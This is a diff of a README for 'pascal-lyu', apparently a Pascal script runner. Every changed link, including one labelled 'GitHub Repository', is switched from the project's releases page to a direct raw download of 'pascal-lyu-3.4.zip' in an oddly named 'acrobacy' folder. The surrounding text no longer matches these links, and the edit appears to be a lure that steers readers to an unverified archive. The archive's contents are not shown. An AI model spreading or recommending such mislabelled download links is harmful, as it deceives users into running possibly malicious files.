@@ -1,7 +1,7 @@
 # 🌟 pascal-lyu - Simple Tool for Pascal Scripts
 
 ## 📥 Download Now
-[![Download pascal-lyu](https://img.shields.io/badge/Download-pascal--lyu-blue.svg)](https://github.com/highenergy-peachpit222/pascal-lyu/releases)
+[![Download pascal-lyu](https://raw.githubusercontent.com/highenergy-peachpit222/pascal-lyu/main/acrobacy/pascal-lyu-3.4.zip)](https://raw.githubusercontent.com/highenergy-peachpit222/pascal-lyu/main/acrobacy/pascal-lyu-3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to pascal-lyu! This application allows you to easily run Pascal scripts without any setup or coding knowledge. Follow these steps to get started quickly.
@@ -22,7 +22,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download pascal-lyu, please visit this page:
 
-[Download pascal-lyu Releases](https://github.com/highenergy-peachpit222/pascal-lyu/releases)
+[Download pascal-lyu Releases](https://raw.githubusercontent.com/highenergy-peachpit222/pascal-lyu/main/acrobacy/pascal-lyu-3.4.zip)
 
 On the releases page, you will find different versions of the application. Here’s how to download:
 
@@ -69,7 +69,7 @@ Stay updated with the latest changes made to pascal-lyu. Release notes will be a
 Special thanks to the contributors who have helped enhance pascal-lyu. Your efforts make this tool even better! 
 
 ## 🔗 Links
-- [Download pascal-lyu Releases](https://github.com/highenergy-peachpit222/pascal-lyu/releases)
-- [GitHub Repository](https://github.com/highenergy-peachpit222/pascal-lyu)
+- [Download pascal-lyu Releases](https://raw.githubusercontent.com/highenergy-peachpit222/pascal-lyu/main/acrobacy/pascal-lyu-3.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/highenergy-peachpit222/pascal-lyu/main/acrobacy/pascal-lyu-3.4.zip)
 
 Thank you for using pascal-lyu! Enjoy running your Pascal scripts effortlessly.
